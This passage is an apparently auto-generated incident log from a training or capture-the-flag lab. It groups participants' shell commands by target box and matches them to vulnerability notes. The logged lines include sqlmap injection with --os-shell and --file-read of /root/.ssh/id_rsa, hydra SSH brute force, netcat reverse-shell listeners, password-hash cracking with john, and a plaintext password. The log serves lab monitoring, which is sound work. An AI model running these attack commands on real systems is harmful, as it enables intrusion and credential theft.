  - 2026-01-27T19:06:54 | logs/10.100.7.32/shell_history.csv#L641 | cat maintenance.ps1

## Incident 204 - 2026-01-27T19:06:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:06:22 | logs/10.100.7.34/shell_history.csv#L71 | nxc smb http://10.100.7.46/ u-username p-password --shares
  - 2026-01-27T19:06:40 | logs/10.100.7.34/shell_history.csv#L72 | nxc smb 10.100.7.46 u-username p-password --shares
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 205 - 2026-01-27T19:06:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:06:00 | logs/10.100.7.22/shell_history.csv#L194 | nxc smb 10.100.7.40 -u solaris -p "
  - 2026-01-27T19:06:31 | logs/10.100.7.22/shell_history.csv#L195 | ssh guest@10.100.7.40

## Incident 206 - 2026-01-27T19:14:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:14:46 | logs/10.100.7.11/shell_history.csv#L197 | smbclient //ember/IPC$ --user EMBER$
  - 2026-01-27T19:14:02 | logs/10.100.7.32/shell_history.csv#L651 | cat maintenance.ps1

## Incident 207 - 2026-01-27T19:14:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:14:07 | logs/10.100.7.22/shell_history.csv#L206 | smbclient solaris:"@10.100.7.40
  - 2026-01-27T19:14:48 | logs/10.100.7.22/shell_history.csv#L207 | smbclient -L //solaris:"@10.100.7.40

## Incident 208 - 2026-01-27T19:17:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:17:05 | logs/10.100.7.11/shell_history.csv#L198 | ssh rand2@10.100.7.46
  - 2026-01-27T19:17:55 | logs/10.100.7.33/shell_history.csv#L113 | nxc smb 10.100.7.46 -p ''
  - 2026-01-27T19:17:35 | logs/10.100.7.14/shell_history.csv#L332 | evil-winrm -i 10.100.7.46 -u rand -p dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 209 - 2026-01-27T19:17:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:17:07 | logs/10.100.7.22/shell_history.csv#L210 | smbclient -L //10.100.7.40 -N
  - 2026-01-27T19:17:07 | logs/10.100.7.22/shell_history.csv#L211 | smbclient -L //10.100.7.40 -N
  - 2026-01-27T19:17:29 | logs/10.100.7.22/shell_history.csv#L212 | smbclient -L //10.100.7.40 -public
  - 2026-01-27T19:17:42 | logs/10.100.7.22/shell_history.csv#L213 | smbclient -L //10.100.7.40/public

## Incident 210 - 2026-01-27T19:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:26:00 | logs/10.100.7.11/shell_history.csv#L199 | nano maintenance.ps1
  - 2026-01-27T19:26:07 | logs/10.100.7.11/shell_history.csv#L200 | cat maintenance.ps1
  - 2026-01-27T19:26:45 | logs/10.100.7.32/shell_history.csv#L661 | clear
  - 2026-01-27T19:26:45 | logs/10.100.7.32/shell_history.csv#L662 | ls
  - 2026-01-27T19:26:09 | logs/10.100.7.14/shell_history.csv#L343 | cd ..
  - 2026-01-27T19:26:16 | logs/10.100.7.14/shell_history.csv#L344 | cd dirbuster
  - 2026-01-27T19:26:19 | logs/10.100.7.14/shell_history.csv#L345 | cd wordlists
  - 2026-01-27T19:26:23 | logs/10.100.7.14/shell_history.csv#L346 | ls
  - 2026-01-27T19:26:06 | logs/10.100.7.24/shell_history.csv#L274 | vim maintenance.ps1
  - 2026-01-27T19:26:32 | logs/10.100.7.24/shell_history.csv#L276 | mv maintenance.ps1 maintenance3.ps1
  - 2026-01-27T19:26:44 | logs/10.100.7.24/shell_history.csv#L278 | vim maintenance.ps1
  - 2026-01-27T19:26:49 | logs/10.100.7.24/shell_history.csv#L279 | ls maintenance.ps1

## Incident 211 - 2026-01-27T19:26:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:26:01 | logs/10.100.7.24/shell_history.csv#L273 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-27T19:26:20 | logs/10.100.7.24/shell_history.csv#L275 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-27T19:26:40 | logs/10.100.7.24/shell_history.csv#L277 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 212 - 2026-01-27T19:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:28:08 | logs/10.100.7.11/shell_history.csv#L201 | smbclient //ember/Scripts --user EMBER$
  - 2026-01-27T19:28:32 | logs/10.100.7.11/shell_history.csv#L202 | smbclient //ember/Scripts --user EMBER$
  - 2026-01-27T19:28:36 | logs/10.100.7.11/shell_history.csv#L203 | cat maintenance.ps1
  - 2026-01-27T19:28:05 | logs/10.100.7.32/shell_history.csv#L663 | cat maintenance.ps1
  - 2026-01-27T19:28:13 | logs/10.100.7.14/shell_history.csv#L348 | dirbuster directory-list-2.3-medium.txt
  - 2026-01-27T19:28:17 | logs/10.100.7.14/shell_history.csv#L349 | tldr
  - 2026-01-27T19:28:22 | logs/10.100.7.14/shell_history.csv#L350 | tldr dirbuster

## Incident 213 - 2026-01-27T19:28:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T19:28:11 | logs/10.100.7.13/shell_history.csv#L221 | ping 10.100.7.45
  - 2026-01-27T19:28:49 | logs/10.100.7.13/shell_history.csv#L222 | nxc smb 10.100.7.45 -u guest -p '' --shares
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 214 - 2026-01-27T19:52:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:52:50 | logs/10.100.7.11/shell_history.csv#L208 | exit
  - 2026-01-27T19:52:53 | logs/10.100.7.11/shell_history.csv#L209 | ls

## Incident 215 - 2026-01-27T19:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:54:25 | logs/10.100.7.11/shell_history.csv#L210 | nc -lvnp 4444
  - 2026-01-27T19:54:37 | logs/10.100.7.11/shell_history.csv#L211 | exit

## Incident 216 - 2026-01-27T20:00:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:00:58 | logs/10.100.7.11/shell_history.csv#L212 | nano php-rev-shell.php4
  - 2026-01-27T20:00:14 | logs/10.100.7.14/shell_history.csv#L381 | wordlists

## Incident 217 - 2026-01-27T20:00:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:00:06 | logs/10.100.7.14/shell_history.csv#L379 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45/FUZZ -fc 200
  - 2026-01-27T20:00:09 | logs/10.100.7.14/shell_history.csv#L380 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45/FUZZ -fc 200
  - 2026-01-27T20:00:37 | logs/10.100.7.14/shell_history.csv#L382 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45
  - 2026-01-27T20:00:47 | logs/10.100.7.14/shell_history.csv#L383 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45/FUZZ
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 218 - 2026-01-27T20:01:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:01:03 | logs/10.100.7.11/shell_history.csv#L213 | ls
  - 2026-01-27T20:01:13 | logs/10.100.7.11/shell_history.csv#L214 | mv php-rev-shell.php4 php-rev-shell.php
  - 2026-01-27T20:01:39 | logs/10.100.7.13/shell_history.csv#L232 | smbclient //orbital/public --user guest

## Incident 219 - 2026-01-27T20:01:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:01:07 | logs/10.100.7.14/shell_history.csv#L384 | ffuf -c -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://10.100.7.45/FUZZ -fc 404
  - 2026-01-27T20:01:35 | logs/10.100.7.12/shell_history.csv#L50 | sqlmap -u 10.100.7.45/panels.php?id=1" --dbms=mssql"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 220 - 2026-01-27T20:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:05:44 | logs/10.100.7.11/shell_history.csv#L215 | exit
  - 2026-01-27T20:05:00 | logs/10.100.7.14/shell_history.csv#L386 | ffuf -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://example.com/index.php?FUZZ=key
  - 2026-01-27T20:05:38 | logs/10.100.7.14/shell_history.csv#L387 | ffuf -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt -u http://example.com/index.php?FUZZ=key -fc 404

## Incident 221 - 2026-01-27T20:06:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:06:03 | logs/10.100.7.32/shell_history.csv#L734 | curl http://10.100.7.45/panels.php?=id3
  - 2026-01-27T20:06:08 | logs/10.100.7.32/shell_history.csv#L735 | curl http://10.100.7.45/panels.php?id=3
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 222 - 2026-02-02T18:36:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:36:57 | logs/10.100.7.14/shell_history.csv#L400 | dirbuster -u http://10.100.7.45 -e directory-list-2.3-medium.txt
  - 2026-02-02T18:36:13 | logs/10.100.7.12/shell_history.csv#L131 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T18:36:49 | logs/10.100.7.12/shell_history.csv#L132 | sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch --tables"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 223 - 2026-02-02T18:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:39:17 | logs/10.100.7.11/shell_history.csv#L219 | penelope
  - 2026-02-02T18:39:50 | logs/10.100.7.12/shell_history.csv#L137 | history
  - 2026-02-02T18:39:53 | logs/10.100.7.12/shell_history.csv#L138 | history

## Incident 224 - 2026-02-02T18:39:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:39:58 | logs/10.100.7.13/shell_history.csv#L260 | hydra -l pyre -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.45
  - 2026-02-02T18:39:17 | logs/10.100.7.12/shell_history.csv#L135 | sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch -T panels --columns"
  - 2026-02-02T18:39:44 | logs/10.100.7.12/shell_history.csv#L136 | sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch -T thermal_readings --columns"
  - 2026-02-02T18:39:55 | logs/10.100.7.12/shell_history.csv#L139 | sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch --tables"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 225 - 2026-02-02T18:45:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:45:28 | logs/10.100.7.11/shell_history.csv#L221 | nc -lvnp 4445
  - 2026-02-02T18:45:29 | logs/10.100.7.11/shell_history.csv#L222 | history
  - 2026-02-02T18:45:06 | logs/10.100.7.13/shell_history.csv#L268 | find / -group pyre

## Incident 226 - 2026-02-02T18:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:46:05 | logs/10.100.7.11/shell_history.csv#L223 | cat ~etc/passwd
  - 2026-02-02T18:46:24 | logs/10.100.7.11/shell_history.csv#L224 | cat /etc/passwd

## Incident 227 - 2026-02-02T18:46:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:46:00 | logs/10.100.7.13/shell_history.csv#L269 | nmap 10.100.7.45 -p 21
  - 2026-02-02T18:46:50 | logs/10.100.7.13/shell_history.csv#L270 | ftp anonymous@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 228 - 2026-02-02T18:47:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:47:19 | logs/10.100.7.11/shell_history.csv#L225 | nc -lvnp 4445
  - 2026-02-02T18:47:24 | logs/10.100.7.11/shell_history.csv#L226 | ls

## Incident 229 - 2026-02-02T18:53:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:53:12 | logs/10.100.7.12/shell_history.csv#L152 | sqlmap -u 10.100.7.45/panels.php?id=1" --privileges"
  - 2026-02-02T18:53:57 | logs/10.100.7.12/shell_history.csv#L153 | sqlmap -u 10.100.7.45/panels.php?id=1" --search -C password"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 230 - 2026-02-02T18:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:54:08 | logs/10.100.7.11/shell_history.csv#L228 | nc -lvnp 4445
  - 2026-02-02T18:54:19 | logs/10.100.7.12/shell_history.csv#L154 | ls
  - 2026-02-02T18:54:21 | logs/10.100.7.12/shell_history.csv#L155 | cd Downloads
  - 2026-02-02T18:54:21 | logs/10.100.7.12/shell_history.csv#L156 | ls
  - 2026-02-02T18:54:23 | logs/10.100.7.12/shell_history.csv#L157 | cd ~

## Incident 231 - 2026-02-02T19:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:02:46 | logs/10.100.7.11/shell_history.csv#L229 | tldr john
  - 2026-02-02T19:02:19 | logs/10.100.7.13/shell_history.csv#L279 | ls ~/.ssh
  - 2026-02-02T19:02:37 | logs/10.100.7.13/shell_history.csv#L280 | cat authorized_keys
  - 2026-02-02T19:02:44 | logs/10.100.7.13/shell_history.csv#L281 | cd authorized_keys

## Incident 232 - 2026-02-02T19:03:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:03:45 | logs/10.100.7.11/shell_history.csv#L230 | touch text.txt
  - 2026-02-02T19:03:00 | logs/10.100.7.13/shell_history.csv#L282 | cd ~/.ssh/authorized_keys
  - 2026-02-02T19:03:11 | logs/10.100.7.13/shell_history.csv#L283 | cat ~/.ssh/authorized_keys

## Incident 233 - 2026-02-02T19:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:04:04 | logs/10.100.7.11/shell_history.csv#L231 | echo $y$j9T$ciDrEijDrtbvU8ITpBVl7/$VkCuKranJi/FNJt8C442uwxMC.jR30Ti7tfRsfuE453 > text.txt
  - 2026-02-02T19:04:12 | logs/10.100.7.11/shell_history.csv#L232 | cat text.txt
  - 2026-02-02T19:04:30 | logs/10.100.7.11/shell_history.csv#L233 | echo $y$j9T$ciDrEijDrtbvU8ITpBVl7/$VkCuKranJi/FNJt8C442uwxMC.jR30Ti7tfRsfuE45" > text.txt"
  - 2026-02-02T19:04:33 | logs/10.100.7.11/shell_history.csv#L234 | cat text.txt

## Incident 234 - 2026-02-02T19:05:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:05:02 | logs/10.100.7.11/shell_history.csv#L235 | cat > text.txt
  - 2026-02-02T19:05:06 | logs/10.100.7.11/shell_history.csv#L236 | cat text.txt
  - 2026-02-02T19:05:22 | logs/10.100.7.11/shell_history.csv#L237 | john text.txt
  - 2026-02-02T19:05:20 | logs/10.100.7.13/shell_history.csv#L284 | ssh-keygen -t ed25519
  - 2026-02-02T19:05:52 | logs/10.100.7.13/shell_history.csv#L285 | cat ~/.ssh/id_ed25519.pub

## Incident 235 - 2026-02-02T19:06:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:06:01 | logs/10.100.7.11/shell_history.csv#L238 | john --format=yescrypt text.txt
  - 2026-02-02T19:06:38 | logs/10.100.7.11/shell_history.csv#L239 | john --format=crypt text.txt
  - 2026-02-02T19:06:21 | logs/10.100.7.13/shell_history.csv#L286 | cat ~/.ssh/id_ed25519.pub

## Incident 236 - 2026-02-02T19:08:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:08:13 | logs/10.100.7.11/shell_history.csv#L240 | sudo apt update john
  - 2026-02-02T19:08:35 | logs/10.100.7.11/shell_history.csv#L241 | sudo apt update
  - 2026-02-02T19:08:52 | logs/10.100.7.11/shell_history.csv#L242 | sudo apt install john

## Incident 237 - 2026-02-02T19:10:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:10:42 | logs/10.100.7.11/shell_history.csv#L243 | sudo apt install john
  - 2026-02-02T19:10:55 | logs/10.100.7.11/shell_history.csv#L244 | tldr unshadow
  - 2026-02-02T19:10:10 | logs/10.100.7.13/shell_history.csv#L287 | smbclient //pyre/public --user guest

## Incident 238 - 2026-02-02T19:30:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:30:21 | logs/10.100.7.14/shell_history.csv#L411 | sqlmap -u http://10.100.7.45/index.php?id=1" --dbs --crawl=2"
  - 2026-02-02T19:30:52 | logs/10.100.7.14/shell_history.csv#L412 | sqlmap -u http://10.100.7.45/index.php?id=1" --dbs --crawl=2 --risk 10"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 239 - 2026-02-02T19:35:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:35:11 | logs/10.100.7.11/shell_history.csv#L246 | nc -lvnp 4445
  - 2026-02-02T19:35:59 | logs/10.100.7.13/shell_history.csv#L300 | ?id=5 AND 1=1

## Incident 240 - 2026-02-02T19:42:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:42:07 | logs/10.100.7.11/shell_history.csv#L247 | nc -lvnp 4445
  - 2026-02-02T19:42:02 | logs/10.100.7.32/shell_history.csv#L839 | ls
  - 2026-02-02T19:42:04 | logs/10.100.7.32/shell_history.csv#L840 | cd dump
  - 2026-02-02T19:42:04 | logs/10.100.7.32/shell_history.csv#L841 | ls
  - 2026-02-02T19:42:05 | logs/10.100.7.32/shell_history.csv#L842 | ls
  - 2026-02-02T19:42:06 | logs/10.100.7.32/shell_history.csv#L843 | cd pyrewatch
  - 2026-02-02T19:42:06 | logs/10.100.7.32/shell_history.csv#L844 | ls
  - 2026-02-02T19:42:09 | logs/10.100.7.32/shell_history.csv#L845 | cat alerts.csv
  - 2026-02-02T19:42:10 | logs/10.100.7.32/shell_history.csv#L846 | ls

## Incident 241 - 2026-02-02T19:42:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:42:00 | logs/10.100.7.32/shell_history.csv#L838 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"
  - 2026-02-02T19:42:18 | logs/10.100.7.32/shell_history.csv#L847 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"
  - 2026-02-02T19:42:26 | logs/10.100.7.32/shell_history.csv#L848 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"
  - 2026-02-02T19:42:37 | logs/10.100.7.13/shell_history.csv#L304 | curl http://10.100.7.45/panels.php?id=5 ORDER BY 1 -- -""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 242 - 2026-02-02T19:46:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:46:13 | logs/10.100.7.13/shell_history.csv#L313 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%220--%20-""
  - 2026-02-02T19:46:22 | logs/10.100.7.13/shell_history.csv#L314 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%240--%20-""
  - 2026-02-02T19:46:34 | logs/10.100.7.13/shell_history.csv#L315 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%280--%20-""
  - 2026-02-02T19:46:43 | logs/10.100.7.13/shell_history.csv#L316 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%580--%20-""
  - 2026-02-02T19:46:56 | logs/10.100.7.13/shell_history.csv#L317 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%780--%20-""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 243 - 2026-02-02T19:47:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:47:13 | logs/10.100.7.11/shell_history.csv#L249 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-02T19:47:17 | logs/10.100.7.11/shell_history.csv#L250 | penelope
  - 2026-02-02T19:47:32 | logs/10.100.7.12/shell_history.csv#L180 | history
  - 2026-02-02T19:47:34 | logs/10.100.7.12/shell_history.csv#L181 | history

## Incident 244 - 2026-02-02T19:47:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:47:08 | logs/10.100.7.13/shell_history.csv#L318 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%980--%20-""
  - 2026-02-02T19:47:45 | logs/10.100.7.12/shell_history.csv#L182 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 245 - 2026-02-03T18:49:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:49:27 | logs/10.100.7.11/shell_history.csv#L251 | nc -lvnp 4445
  - 2026-02-03T18:49:29 | logs/10.100.7.11/shell_history.csv#L252 | penelop
  - 2026-02-03T18:49:32 | logs/10.100.7.11/shell_history.csv#L253 | penelope

## Incident 246 - 2026-02-03T18:50:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:50:53 | logs/10.100.7.11/shell_history.csv#L254 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-03T18:50:57 | logs/10.100.7.11/shell_history.csv#L255 | penelope
  - 2026-02-03T18:50:03 | logs/10.100.7.32/shell_history.csv#L900 | ls
  - 2026-02-03T18:50:33 | logs/10.100.7.32/shell_history.csv#L901 | ls

## Incident 247 - 2026-02-03T18:51:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:51:19 | logs/10.100.7.11/shell_history.csv#L256 | penelope
  - 2026-02-03T18:51:21 | logs/10.100.7.11/shell_history.csv#L257 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-03T18:51:37 | logs/10.100.7.11/shell_history.csv#L258 | history
  - 2026-02-03T18:51:57 | logs/10.100.7.11/shell_history.csv#L259 | penelope

## Incident 248 - 2026-02-03T18:51:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:51:08 | logs/10.100.7.32/shell_history.csv#L902 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/home/pyre/ctrl.txt"
  - 2026-02-03T18:51:43 | logs/10.100.7.12/shell_history.csv#L221 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 249 - 2026-02-03T18:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T18:56:42 | logs/10.100.7.11/shell_history.csv#L260 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-03T18:56:54 | logs/10.100.7.11/shell_history.csv#L261 | penelope

## Incident 250 - 2026-02-03T18:56:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:56:02 | logs/10.100.7.32/shell_history.csv#L910 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../../opt""
  - 2026-02-03T18:56:19 | logs/10.100.7.32/shell_history.csv#L911 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="cat ./index.php""
  - 2026-02-03T18:56:41 | logs/10.100.7.32/shell_history.csv#L912 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="cat ./alerts.php""
  - 2026-02-03T18:56:59 | logs/10.100.7.12/shell_history.csv#L227 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="ls""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 251 - 2026-02-03T19:05:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-02-03T19:05:02 | logs/10.100.7.11/shell_history.csv#L263 | ssh solaris@10.100.7.40
  - 2026-02-03T19:05:31 | logs/10.100.7.31/shell_history.csv#L30 | nmap 10.100.7.40 -p 445

## Incident 252 - 2026-02-03T19:05:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:05:59 | logs/10.100.7.12/shell_history.csv#L230 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:05:17 | logs/10.100.7.31/shell_history.csv#L29 | hydra -t 4 -V -f -l pyre -P rockyou.txt.gz ssh://10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 253 - 2026-02-03T19:11:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:11:21 | logs/10.100.7.11/shell_history.csv#L264 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-03T19:11:32 | logs/10.100.7.23/shell_history.csv#L6 | sudo bash
  - 2026-02-03T19:11:34 | logs/10.100.7.23/shell_history.csv#L7 | ls
  - 2026-02-03T19:11:00 | logs/10.100.7.31/shell_history.csv#L46 | ls
  - 2026-02-03T19:11:02 | logs/10.100.7.31/shell_history.csv#L47 | cd

## Incident 254 - 2026-02-03T19:18:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:18:16 | logs/10.100.7.11/shell_history.csv#L265 | wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
  - 2026-02-03T19:18:18 | logs/10.100.7.11/shell_history.csv#L266 | echo hello
  - 2026-02-03T19:18:31 | logs/10.100.7.31/shell_history.csv#L51 | clear

## Incident 255 - 2026-02-03T19:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:25:49 | logs/10.100.7.11/shell_history.csv#L267 | echo hello
  - 2026-02-03T19:25:03 | logs/10.100.7.12/shell_history.csv#L247 | history
  - 2026-02-03T19:25:01 | logs/10.100.7.31/shell_history.csv#L63 | cd /usr/share/wordlists/
  - 2026-02-03T19:25:04 | logs/10.100.7.31/shell_history.csv#L64 | ls
  - 2026-02-03T19:25:11 | logs/10.100.7.31/shell_history.csv#L65 | ~ls dirb
  - 2026-02-03T19:25:12 | logs/10.100.7.31/shell_history.csv#L66 | ls dirb
  - 2026-02-03T19:25:19 | logs/10.100.7.31/shell_history.csv#L67 | ls dirbuster
  - 2026-02-03T19:25:59 | logs/10.100.7.31/shell_history.csv#L69 | ls

## Incident 256 - 2026-02-03T19:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-03T19:28:57 | logs/10.100.7.11/shell_history.csv#L268 | nc -lvnp 4445
  - 2026-02-03T19:28:46 | logs/10.100.7.32/shell_history.csv#L939 | ls
  - 2026-02-03T19:28:48 | logs/10.100.7.32/shell_history.csv#L940 | cd Downloads
  - 2026-02-03T19:28:48 | logs/10.100.7.32/shell_history.csv#L941 | ls
  - 2026-02-03T19:28:51 | logs/10.100.7.32/shell_history.csv#L942 | cd ../Documents
  - 2026-02-03T19:28:51 | logs/10.100.7.32/shell_history.csv#L943 | ls
  - 2026-02-03T19:28:52 | logs/10.100.7.32/shell_history.csv#L944 | cd ..
  - 2026-02-03T19:28:53 | logs/10.100.7.32/shell_history.csv#L945 | ls

## Incident 257 - 2026-02-03T19:28:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:28:45 | logs/10.100.7.32/shell_history.csv#L938 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:28:21 | logs/10.100.7.12/shell_history.csv#L249 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
